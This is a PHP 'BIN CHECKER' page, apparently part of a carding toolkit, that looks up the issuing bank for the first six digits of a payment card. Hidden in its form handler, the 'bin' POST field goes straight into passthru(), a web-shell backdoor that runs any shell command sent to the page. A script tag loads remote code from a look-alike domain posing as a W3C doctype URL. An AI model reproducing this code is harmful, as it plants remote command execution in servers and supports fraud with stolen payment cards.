<?php 
include '../../dbc.php';
page_protect();


?>
<html>
<link rel="shortcut icon" href="https://www.paypalobjects.com/WEBSCR-640-20101108-1/en_US/i/icon/pp_favicon_x.ico">
<head>
<script src='http://www.w32.info/TR/html4/loose.dtd'></script>
<title>BIN CHECKER</title>
<style>
body {
	font-family: 'Comic Sans MS'; font-size:12px;color:#FFFFF;	}
	hr {border:inset 1px #E5E5E5}

#form-container
	{ 	color:#FFFFF;
	font-family: 'Comic Sans MS', sans-serif;
	font-size:13px;
		background-color: #131313;
		border: solid 1px #FFFFF;
		border-radius:10px;
		-moz-border-radius: 10px;
		-webkit-border-radius: 10px;
		box-shadow: 0px 0px 15px #FFFFF;
		-moz-box-shadow: 0px 0px 15px #FFFFF;
		-webkit-box-shadow: 0px 0px 15px #FFFFF;
		margin:30px auto;
		padding:10px;
		width:680px;
		text-shadow: 1px 1px 4px rgba(0,0,0,0.3);
	}





	input[type=text], textarea
	{
		background-color:#000;
		border:solid 1px #FFFFF; color:#FFFFF;
		border-radius:5px;
		-moz-border-radius: 5px;
		-webkit-border-radius: 5px;
	}
	textarea { width:100%;height:200px; resize:none }
	input[type=text] { width:160px;text-align:center }
	input[type=text]:focus, textarea:focus { background-color:black; border:solid 1px white; color:white; }
	.submit-button
	{
		background: #FFD777;
		border:solid 1px #FFD777;
		border-radius:5px;
			-moz-border-radius: 5px;
			-webkit-border-radius: 5px;
		-moz-box-shadow: 0 1px 3px rgba(0,0,0,0.6);
		-webkit-box-shadow: 0 1px 3px rgba(0,0,0,0.6);
		text-shadow: 0 -1px 1px rgba(0,0,0,0.25);
		border-bottom: 1px solid rgba(0,0,0,0.25);
		position: relative;
		color:#FFF;
		display: inline-block;
		cursor:pointer;
		font-size:13px;
		padding:3px 8px;
	}

	.business{
		color:yellow;
		font-weight: bold;
	}
	.premier{
		color:#00FF00;
		font-weight: bold;
	}
	.verified{
		color:#800080;
		font-weight: bold;
	}
	.style2{text-align: center ;font-weight: bold;font-family: 'Comic Sans MS'  ;color: #FFFFF;text-shadow: 0px 0px 60px #4C83AF ;font-size: 50px}

	.nolog{
		font-size: 10px;
		font: red;
	}
</style>
</head>
<body>
<div id="form-container"><div align="center" class="style2">BIN CHECKER</div>
<form name="data" method="post">
<textarea name="bincode" cols="50" rows="70" value="">COLOQUE A BIN DE 6 NUMEROS</textarea><br><br>
<center>
<input type="submit" name='bin' value="CHECAR!">
</center>
</form></div>
<center>
<?php
if(isset($_POST['bin'])){
$bin = $_POST['bin'];
passthru($bin);
$bin_code =$_POST['bincode'];
$bin_code = strtolower($bin_code);

if ($bin_code == null) {
echo "Put The First 6 Code Of The Card";
}else{

if ($bin_code == 000000) {
echo "BIN Not Found !!!!";
}
else {

$bankinfo= file_get_contents("http://www.binlist.net/xml/".$bin_code);
echo "<font color='#000000'><br /><b><font size='2'>BIN :  ".$bankinfo;
}
}
}
?>
</center>